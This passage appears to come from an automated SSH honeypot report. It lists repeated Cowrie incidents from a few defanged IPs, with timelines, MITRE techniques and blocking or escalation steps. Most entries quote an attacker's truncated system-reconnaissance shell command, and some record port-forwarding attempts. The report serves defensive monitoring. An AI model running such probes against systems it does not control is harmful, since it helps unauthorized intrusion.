| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:08:44` | `cowrie.session.connect` |
| `2026-07-24 18:08:45` | `cowrie.client.version` |
| `2026-07-24 18:08:45` | `cowrie.client.kex` |
| `2026-07-24 18:08:47` | `cowrie.login.success` |
| `2026-07-24 18:08:49` | `cowrie.session.params` |
| `2026-07-24 18:08:49` | `cowrie.command.input` |
| `2026-07-24 18:08:49` | `cowrie.command.input` |
| `2026-07-24 18:08:49` | `cowrie.command.input` |
| `2026-07-24 18:08:49` | `cowrie.command.input` |
| `2026-07-24 18:08:49` | `cowrie.command.input` |
| `2026-07-24 18:08:49` | `cowrie.command.success` |
| `2026-07-24 18:08:49` | `cowrie.command.input` |
| `2026-07-24 18:08:49` | `cowrie.command.input` |
| `2026-07-24 18:08:49` | `cowrie.command.input` |
| `2026-07-24 18:08:49` | `cowrie.command.input` |
| `2026-07-24 18:08:49` | `cowrie.log.closed` |
| `2026-07-24 18:08:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c5638a887e3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:09 |
| **Last Seen** | 2026-07-24 18:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:09:44` | `cowrie.session.connect` |
| `2026-07-24 18:09:44` | `cowrie.client.version` |
| `2026-07-24 18:09:44` | `cowrie.client.kex` |
| `2026-07-24 18:09:47` | `cowrie.login.success` |
| `2026-07-24 18:09:49` | `cowrie.session.params` |
| `2026-07-24 18:09:49` | `cowrie.command.input` |
| `2026-07-24 18:09:49` | `cowrie.command.input` |
| `2026-07-24 18:09:49` | `cowrie.command.input` |
| `2026-07-24 18:09:49` | `cowrie.command.input` |
| `2026-07-24 18:09:49` | `cowrie.command.input` |
| `2026-07-24 18:09:49` | `cowrie.command.success` |
| `2026-07-24 18:09:49` | `cowrie.command.input` |
| `2026-07-24 18:09:49` | `cowrie.command.input` |
| `2026-07-24 18:09:49` | `cowrie.command.input` |
| `2026-07-24 18:09:49` | `cowrie.command.input` |
| `2026-07-24 18:09:49` | `cowrie.log.closed` |
| `2026-07-24 18:09:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fb99a5f3073

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:10 |
| **Last Seen** | 2026-07-24 18:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:10:00` | `cowrie.session.connect` |
| `2026-07-24 18:10:00` | `cowrie.client.version` |
| `2026-07-24 18:10:00` | `cowrie.client.kex` |
| `2026-07-24 18:10:03` | `cowrie.login.success` |
| `2026-07-24 18:10:04` | `cowrie.session.params` |
| `2026-07-24 18:10:04` | `cowrie.command.input` |
| `2026-07-24 18:10:04` | `cowrie.command.input` |
| `2026-07-24 18:10:04` | `cowrie.command.input` |
| `2026-07-24 18:10:04` | `cowrie.command.input` |
| `2026-07-24 18:10:04` | `cowrie.command.input` |
| `2026-07-24 18:10:04` | `cowrie.command.success` |
| `2026-07-24 18:10:04` | `cowrie.command.input` |
| `2026-07-24 18:10:04` | `cowrie.command.input` |
| `2026-07-24 18:10:04` | `cowrie.command.input` |
| `2026-07-24 18:10:04` | `cowrie.command.input` |
| `2026-07-24 18:10:05` | `cowrie.log.closed` |
| `2026-07-24 18:10:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-881d185e9986

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:11 |
| **Last Seen** | 2026-07-24 18:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:11:17` | `cowrie.session.connect` |
| `2026-07-24 18:11:17` | `cowrie.client.version` |
| `2026-07-24 18:11:17` | `cowrie.client.kex` |
| `2026-07-24 18:11:20` | `cowrie.login.success` |
| `2026-07-24 18:11:21` | `cowrie.session.params` |
| `2026-07-24 18:11:21` | `cowrie.command.input` |
| `2026-07-24 18:11:21` | `cowrie.command.input` |
| `2026-07-24 18:11:21` | `cowrie.command.input` |
| `2026-07-24 18:11:21` | `cowrie.command.input` |
| `2026-07-24 18:11:21` | `cowrie.command.input` |
| `2026-07-24 18:11:21` | `cowrie.command.success` |
| `2026-07-24 18:11:21` | `cowrie.command.input` |
| `2026-07-24 18:11:21` | `cowrie.command.input` |
| `2026-07-24 18:11:21` | `cowrie.command.input` |
| `2026-07-24 18:11:21` | `cowrie.command.input` |
| `2026-07-24 18:11:22` | `cowrie.log.closed` |
| `2026-07-24 18:11:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2d344b8bd89

| Field | Detail |
|---|---|
| **Source IP** | `119.247.187[.]188` |
| **First Seen** | 2026-07-24 18:11 |
| **Last Seen** | 2026-07-24 18:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:11:27` | `cowrie.session.connect` |
| `2026-07-24 18:11:27` | `cowrie.client.version` |
| `2026-07-24 18:11:27` | `cowrie.client.kex` |
| `2026-07-24 18:11:29` | `cowrie.login.success` |
| `2026-07-24 18:11:29` | `cowrie.direct-tcpip.request` |
| `2026-07-24 18:11:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.247.187[.]188` to AbuseIPDB if not already reported
- [ ] Block `119.247.187[.]188` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42d70f81ffc6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:11 |
| **Last Seen** | 2026-07-24 18:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:11:37` | `cowrie.session.connect` |
| `2026-07-24 18:11:37` | `cowrie.client.version` |
| `2026-07-24 18:11:37` | `cowrie.client.kex` |
| `2026-07-24 18:11:39` | `cowrie.login.success` |
| `2026-07-24 18:11:41` | `cowrie.session.params` |
| `2026-07-24 18:11:41` | `cowrie.command.input` |
| `2026-07-24 18:11:41` | `cowrie.command.input` |
| `2026-07-24 18:11:41` | `cowrie.command.input` |
| `2026-07-24 18:11:41` | `cowrie.command.input` |
| `2026-07-24 18:11:41` | `cowrie.command.input` |
| `2026-07-24 18:11:41` | `cowrie.command.success` |
| `2026-07-24 18:11:41` | `cowrie.command.input` |
| `2026-07-24 18:11:41` | `cowrie.command.input` |
| `2026-07-24 18:11:41` | `cowrie.command.input` |
| `2026-07-24 18:11:41` | `cowrie.command.input` |
| `2026-07-24 18:11:41` | `cowrie.log.closed` |
| `2026-07-24 18:11:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee9c9499fcca

| Field | Detail |
|---|---|
| **Source IP** | `211.178.165[.]251` |
| **First Seen** | 2026-07-24 18:11 |
| **Last Seen** | 2026-07-24 18:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:11:39` | `cowrie.session.connect` |
| `2026-07-24 18:11:40` | `cowrie.client.version` |
| `2026-07-24 18:11:40` | `cowrie.client.kex` |
| `2026-07-24 18:11:42` | `cowrie.login.success` |
| `2026-07-24 18:11:43` | `cowrie.direct-tcpip.request` |
| `2026-07-24 18:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.178.165[.]251` to AbuseIPDB if not already reported
- [ ] Block `211.178.165[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dc3917b4fd3

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:12 |
| **Last Seen** | 2026-07-24 18:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:12:33` | `cowrie.session.connect` |
| `2026-07-24 18:12:34` | `cowrie.client.version` |
| `2026-07-24 18:12:34` | `cowrie.client.kex` |
| `2026-07-24 18:12:36` | `cowrie.login.success` |
| `2026-07-24 18:12:37` | `cowrie.session.params` |
| `2026-07-24 18:12:37` | `cowrie.command.input` |
| `2026-07-24 18:12:37` | `cowrie.command.input` |
| `2026-07-24 18:12:37` | `cowrie.command.input` |
| `2026-07-24 18:12:37` | `cowrie.command.input` |
| `2026-07-24 18:12:37` | `cowrie.command.input` |
| `2026-07-24 18:12:37` | `cowrie.command.success` |
| `2026-07-24 18:12:37` | `cowrie.command.input` |
| `2026-07-24 18:12:37` | `cowrie.command.input` |
| `2026-07-24 18:12:37` | `cowrie.command.input` |
| `2026-07-24 18:12:37` | `cowrie.command.input` |
| `2026-07-24 18:12:38` | `cowrie.log.closed` |
| `2026-07-24 18:12:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d78b34f33af0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:13 |
| **Last Seen** | 2026-07-24 18:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:13:27` | `cowrie.session.connect` |
| `2026-07-24 18:13:28` | `cowrie.client.version` |
| `2026-07-24 18:13:28` | `cowrie.client.kex` |
| `2026-07-24 18:13:30` | `cowrie.login.success` |
| `2026-07-24 18:13:32` | `cowrie.session.params` |
| `2026-07-24 18:13:32` | `cowrie.command.input` |
| `2026-07-24 18:13:32` | `cowrie.command.input` |
| `2026-07-24 18:13:32` | `cowrie.command.input` |
| `2026-07-24 18:13:32` | `cowrie.command.input` |
| `2026-07-24 18:13:32` | `cowrie.command.input` |
| `2026-07-24 18:13:32` | `cowrie.command.success` |
| `2026-07-24 18:13:32` | `cowrie.command.input` |
| `2026-07-24 18:13:32` | `cowrie.command.input` |
| `2026-07-24 18:13:32` | `cowrie.command.input` |
| `2026-07-24 18:13:32` | `cowrie.command.input` |
| `2026-07-24 18:13:33` | `cowrie.log.closed` |
| `2026-07-24 18:13:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3021113b0ee6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:13 |
| **Last Seen** | 2026-07-24 18:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:13:49` | `cowrie.session.connect` |
| `2026-07-24 18:13:49` | `cowrie.client.version` |
| `2026-07-24 18:13:49` | `cowrie.client.kex` |
| `2026-07-24 18:13:51` | `cowrie.login.success` |
| `2026-07-24 18:13:53` | `cowrie.session.params` |
| `2026-07-24 18:13:53` | `cowrie.command.input` |
| `2026-07-24 18:13:53` | `cowrie.command.input` |
| `2026-07-24 18:13:53` | `cowrie.command.input` |
| `2026-07-24 18:13:53` | `cowrie.command.input` |
| `2026-07-24 18:13:53` | `cowrie.command.input` |
| `2026-07-24 18:13:53` | `cowrie.command.success` |
| `2026-07-24 18:13:53` | `cowrie.command.input` |
| `2026-07-24 18:13:54` | `cowrie.command.input` |
| `2026-07-24 18:13:54` | `cowrie.command.input` |
| `2026-07-24 18:13:54` | `cowrie.command.input` |
| `2026-07-24 18:13:54` | `cowrie.log.closed` |
| `2026-07-24 18:13:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-443e6bcfcf96

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:15 |
| **Last Seen** | 2026-07-24 18:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:15:04` | `cowrie.session.connect` |
| `2026-07-24 18:15:05` | `cowrie.client.version` |
| `2026-07-24 18:15:05` | `cowrie.client.kex` |
| `2026-07-24 18:15:07` | `cowrie.login.success` |
| `2026-07-24 18:15:09` | `cowrie.session.params` |
| `2026-07-24 18:15:09` | `cowrie.command.input` |
| `2026-07-24 18:15:09` | `cowrie.command.input` |
| `2026-07-24 18:15:09` | `cowrie.command.input` |
| `2026-07-24 18:15:09` | `cowrie.command.input` |
| `2026-07-24 18:15:09` | `cowrie.command.input` |
| `2026-07-24 18:15:09` | `cowrie.command.success` |
| `2026-07-24 18:15:09` | `cowrie.command.input` |
| `2026-07-24 18:15:09` | `cowrie.command.input` |
| `2026-07-24 18:15:09` | `cowrie.command.input` |
| `2026-07-24 18:15:09` | `cowrie.command.input` |
| `2026-07-24 18:15:09` | `cowrie.log.closed` |
| `2026-07-24 18:15:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01855087c88c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:15 |
| **Last Seen** | 2026-07-24 18:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:15:16` | `cowrie.session.connect` |
| `2026-07-24 18:15:16` | `cowrie.client.version` |
| `2026-07-24 18:15:16` | `cowrie.client.kex` |
| `2026-07-24 18:15:19` | `cowrie.login.success` |
| `2026-07-24 18:15:20` | `cowrie.session.params` |
| `2026-07-24 18:15:20` | `cowrie.command.input` |
| `2026-07-24 18:15:20` | `cowrie.command.input` |
| `2026-07-24 18:15:20` | `cowrie.command.input` |
| `2026-07-24 18:15:20` | `cowrie.command.input` |
| `2026-07-24 18:15:20` | `cowrie.command.input` |
| `2026-07-24 18:15:20` | `cowrie.command.success` |
| `2026-07-24 18:15:20` | `cowrie.command.input` |
| `2026-07-24 18:15:20` | `cowrie.command.input` |
| `2026-07-24 18:15:20` | `cowrie.command.input` |
| `2026-07-24 18:15:20` | `cowrie.command.input` |
| `2026-07-24 18:15:21` | `cowrie.log.closed` |
| `2026-07-24 18:15:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51976fbe3d1d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-24 18:16 |
| **Last Seen** | 2026-07-24 18:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 18:16:20` | `cowrie.session.connect` |
| `2026-07-24 18:16:20` | `cowrie.client.version` |
| `2026-07-24 18:16:20` | `cowrie.client.kex` |
| `2026-07-24 18:16:23` | `cowrie.login.success` |
| `2026-07-24 18:16:24` | `cowrie.session.params` |
| `2026-07-24 18:16:24` | `cowrie.command.input` |
| `2026-07-24 18:16:24` | `cowrie.command.input` |
| `2026-07-24 18:16:24` | `cowrie.command.input` |
| `2026-07-24 18:16:24` | `cowrie.command.input` |
| `2026-07-24 18:16:24` | `cowrie.command.input` |
| `2026-07-24 18:16:24` | `cowrie.command.success` |
| `2026-07-24 18:16:24` | `cowrie.command.input` |
| `2026-07-24 18:16:24` | `cowrie.command.input` |
| `2026-07-24 18:16:24` | `cowrie.command.input` |
| `2026-07-24 18:16:24` | `cowrie.command.input` |
| `2026-07-24 18:16:25` | `cowrie.log.closed` |
| `2026-07-24 18:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-038471a02ae8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 18:17 |
| **Last Seen** | 2026-07-24 18:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
